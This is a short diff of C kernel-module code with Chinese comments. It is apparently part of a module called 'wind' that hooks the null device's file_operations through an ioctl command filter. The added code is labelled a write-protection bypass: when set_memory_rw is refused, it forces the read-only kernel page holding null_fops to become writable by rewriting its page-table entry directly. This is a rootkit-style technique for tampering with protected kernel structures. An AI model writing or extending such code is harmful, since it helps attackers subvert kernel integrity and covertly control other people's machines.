@@ -49,18 +49,25 @@ static inline bool is_wind_cmd(unsigned int cmd)
 	return (cmd & 0xFFFF0000u) == (WIND_OP_BASE & 0xFFFF0000u);
 }
 
-/* ---- fops 写保护绕过 (null_fops 在 rodata) ---- */
+/* ---- fops 写保护绕过 (null_fops 在 rodata, set_memory_rw 对内核镜像返回 EINVAL) ---- */
 static int fops_unlock(void)
 {
 	unsigned long page = (unsigned long)g_null_fops & PAGE_MASK;
-	return wind_set_memory_rw(page, 1);
+	int ret;
+
+	ret = wind_set_memory_rw(page, 1);
+	if (ret == 0)
+		return 0;
+	/* set_memory_rw 不接受内核镜像 rodata 地址, 降级到 PTE 级改写 */
+	return wind_force_kernel_page_rw(page, true);
 }
 
 static void fops_relock(void)
 {
 	unsigned long page = (unsigned long)g_null_fops & PAGE_MASK;
-	if (wind_set_memory_ro(page, 1))
-		printk(KERN_WARNING "wind: set_memory_ro failed (page left rw)\n");
+
+	if (wind_force_kernel_page_rw(page, false))
+		printk(KERN_WARNING "wind: force ro failed (page left rw)\n");
 }
 
 /*
